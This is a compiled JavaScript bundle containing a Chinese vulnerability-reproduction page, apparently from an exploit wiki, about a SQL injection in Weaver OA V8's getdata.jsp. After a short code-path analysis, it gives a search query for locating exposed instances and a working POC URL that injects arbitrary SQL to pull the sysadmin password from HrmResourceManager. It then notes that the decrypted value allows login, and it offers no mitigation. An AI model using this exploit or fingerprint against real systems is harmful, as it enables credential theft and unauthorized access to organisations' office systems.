(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{1285:function(t,a,s){t.exports=s.p+"assets/img/fanwei-17.d5cc9a83.png"},1286:function(t,a,s){t.exports=s.p+"assets/img/fanwei-18.0ef30eb5.png"},1287:function(t,a,s){t.exports=s.p+"assets/img/fanwei-19.290f9564.png"},1288:function(t,a,s){t.exports=s.p+"assets/img/fanwei-20.2a098595.png"},1289:function(t,a,s){t.exports=s.p+"assets/img/fanwei-21.960e295c.png"},2192:function(t,a,s){"use strict";s.r(a);var e=s(75),r=Object(e.a)({},(function(){var t=this,a=t.$createElement,e=t._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"泛微oa-getdata-jsp-sql注入漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-getdata-jsp-sql注入漏洞"}},[t._v("#")]),t._v(" 泛微OA getdata.jsp SQL注入漏洞")]),t._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),e("p",[t._v("泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限")]),t._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("泛微OA V8")]),e("br"),t._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v('app="泛微-协同办公OA"')]),e("br"),t._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),e("p",[t._v("在getdata.jsp中，直接将request对象交给")]),t._v(" "),e("p",[e("strong",[t._v("weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) :")])]),t._v(" "),e("p",[t._v("方法处理")]),t._v(" "),e("p",[e("img",{attrs:{src:s(1285),alt:"img"}})]),t._v(" "),e("p",[t._v("在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法")]),t._v(" "),e("p",[e("img",{attrs:{src:s(1286),alt:"img"}})]),t._v(" "),e("p",[t._v("Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)")]),t._v(" "),e("p",[t._v("在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中")]),t._v(" "),e("p",[e("img",{attrs:{src:s(1287),alt:"img"}})]),t._v(" "),e("p",[t._v("POC")]),t._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[t._v("http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])]),e("p",[t._v("查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）")]),t._v(" "),e("p",[e("img",{attrs:{src:s(1288),alt:"img"}})]),t._v(" "),e("p",[t._v("解密后即可登录系统")]),t._v(" "),e("p",[e("img",{attrs:{src:s(1289),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);